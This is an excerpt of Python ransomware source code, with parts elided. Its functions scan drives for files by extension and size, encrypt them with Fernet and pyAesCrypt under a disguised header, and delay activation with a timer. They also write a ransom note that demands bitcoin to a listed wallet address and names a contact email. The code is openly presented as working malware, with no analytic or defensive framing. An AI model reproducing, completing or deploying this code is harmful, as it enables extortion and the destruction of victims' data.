...
def suitable(path: str):
    ...
    """
    if any(s for s in Config.SKIP if s in path.lower()) and re.match(
        f".*?\\.({get_extensions()})?$", path
    ):
        deb(f"\rexclude {path}")
        return False
    
    if (
        re.match(f".*?\\.({get_extensions()})?$", path)
        and config["core"]["encryption_dir"].lower() not in path.lower()
    ):
        if (
            Config.MAX_FILE_SIZE_MB
            >= (os.stat(path).st_size / 1024.0 / 1024.0)
...
def crypt_data(data_to_crypt: bytes):
    fernet = Fernet(key)
    file_struct = (
        pack("245s", bytes(str_id_generator(size=245), encoding="utf8"))
        + bytes("!!!", encoding="utf8")
        + data_to_crypt
    )
...
def get_activation_time() -> str:
    return str(
        ...
        + 60 * Config.SLEEP_TIME_UNTIL_ENCRYPTION_MINUTES
    )
...
def write_advert(file):
    ...
    file.write(
        f"\tdecryption payment bitcoin amount is: 0.0029 bitcoins (~100USD) (for all files)\r\n"
    )
    file.write(
        f"\tpayment bitcoin address: bc1qmw03xvyv0qjrsp2wlk2hp0x8c6lqejrlxtuz3c\r\n"
    )
    file.write(f"\tid of your computer: {get_computer_uid()}\r\n")
    file.write(
        f"\tafter payment you will need to notify me to on email sgn2002@protonmail.com\r\n"
    )
    file.write(
        f"\t\tmsg: hello, my id is [computer_id], bitcoin wallet [your_bitcoin_wallet]\r\n"
    )
...
def analyze_network():
    ...
    while run_analyze_network:
        ...
        deb(
            f"\rnetwork [{net_stats}] bytes_in: {net_stats.bytes_recv - last_recv:8} bytes_out: {net_stats.bytes_sent - last_sent:8}\r"
        )
...
if __name__ == "__main__":
    ...
    if not config.has_section("core") or not config.has_option(
        "core", "encryption_dir"
    ):
    ...
    for drive in drives:
        ...
        for file in files:
            try:
                if suitable(file):
                    deb(
                        f"\radd {file} ({os.stat(file).st_size / 1024.0 / 1024.0:.2f}MB)"
                    )
    ...
    for file in files_to_encrypt:
        ...
        try:
            ...
            with open(file, "rb") as f:
                try:
                    crypted_file_name = (
                        f"{config['core']['encryption_dir']}\\"
                        + hex(binascii.crc32(bytes(file, encoding="utf8")))
                        + f"-{filename}-crypted"
                    )
                    if (
                        os.path.exists(crypted_file_name)
                        and os.stat(crypted_file_name).st_size > 0
                    ):
                        deb(
                    ...
                    fCiph = io.BytesIO()
                    deb(
                        f"crypting ... Processing: {num_encrypted / len(files_to_encrypt) * 100.0:.2f}%",
                        end="",
                    )
                    ...
                    try:
                        with open(crypted_file_name, "wb") as w:
                            w.write(hdr)
                            encrypted_data = fCiph.getvalue().replace(
                                b"pyAesCrypt", b"4ertKcrypt"
                            )
    ...
    tag_system()
    uprint(
        f"{get_computer_uid()}: done encryption, {num_encrypted}/{len(files_to_encrypt)} files encrypted, "
